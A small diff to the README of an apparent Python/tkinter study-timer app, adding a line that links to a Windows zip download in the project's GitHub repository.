@@ -32,5 +32,5 @@ A productivity application that helps track study/work sessions with:
 - tkinter (usually included with Python)
 
 Powered by Nineyxl
-
+to download for windows [ https://github.com/jennyx97/Study_timer/blob/main/Timer_For_Study%20zip.zip ] 
 ![TimerScreenshot](https://github.com/user-attachments/assets/ce26992f-d48d-48a0-b3e7-e81129842b46)
